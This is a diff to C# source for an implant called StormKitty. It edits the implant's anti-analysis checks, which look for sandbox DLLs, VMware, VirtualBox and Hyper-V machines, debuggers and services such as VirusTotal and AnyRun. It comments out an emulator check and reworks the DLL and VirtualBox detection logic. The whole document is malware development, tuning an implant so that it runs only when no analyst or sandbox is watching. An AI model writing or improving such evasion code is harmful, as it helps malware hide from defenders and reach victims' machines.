@@ -35,7 +35,7 @@ namespace StormKitty.Implant // Анальный
         /// <summary>
         /// Returns true if the file is running in emulator; otherwise returns false
         /// </summary>
-        private static bool Emulator()
+        /*private static bool Emulator()
         {
             try
             {
@@ -46,7 +46,7 @@ namespace StormKitty.Implant // Анальный
             }
             catch { }
             return false;
-        }
+        }*/
 
         /// <summary>
         /// Returns true if the file is running on the server (VirusTotal, AnyRun); otherwise returns false
@@ -87,14 +87,14 @@ namespace StormKitty.Implant // Анальный
         {
             string[] dlls = new string[5]
             {
-                "SbieDll.dll",
-                "SxIn.dll",
-                "Sf2.dll",
-                "snxhk.dll",
-                "cmdvrt32.dll"
+                "SbieDll",
+                "SxIn",
+                "Sf2",
+                "snxhk",
+                "cmdvrt32"
             };
             foreach (string dll in dlls)
-                if (GetModuleHandle(dll).ToInt32() != 0)
+                if (GetModuleHandle(dll + ".dll").ToInt32() != 0)
                     return true;
             return false;
         }
@@ -105,20 +105,23 @@ namespace StormKitty.Implant // Анальный
         private static bool VirtualBox()
         {
             using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
-            {
                 try
                 {
                     using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
                         foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
-                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
+                            if ((managementBaseObject["Manufacturer"].ToString().ToLower() == "microsoft corporation" &&
+                                 managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) ||
+                                 managementBaseObject["Manufacturer"].ToString().ToLower().Contains("vmware") ||
+                                 managementBaseObject["Model"].ToString() == "VirtualBox")
                                 return true;
-
                 }
-                catch { return true; }
-            }
+                catch { }
+            
             foreach (ManagementBaseObject managementBaseObject2 in new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get())
-                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
+                if (managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VMware") 
+                    && managementBaseObject2.GetPropertyValue("Name").ToString().Contains("VBox"))
                     return true;
+           
             return false;
         }
 
@@ -133,7 +136,7 @@ namespace StormKitty.Implant // Анальный
                 if (Processes()) return true;
                 if (VirtualBox()) return true;
                 if (SandBox()) return true;
-                if (Emulator()) return true;
+                //if (Emulator()) return true;
                 if (Debugger()) return true;
             }
             return false;
